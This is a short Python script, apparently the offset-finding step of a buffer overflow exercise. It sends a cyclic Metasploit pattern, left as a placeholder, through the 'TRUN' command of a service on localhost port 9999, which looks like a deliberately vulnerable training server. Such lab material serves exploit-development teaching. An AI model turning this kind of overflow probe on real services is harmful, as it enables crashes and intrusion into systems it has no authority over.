import socket
 
pattern = b"<paste the output of msf-pattern_create here>"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(b"TRUN /.:/ " + pattern + b"\r\n")
s.close()
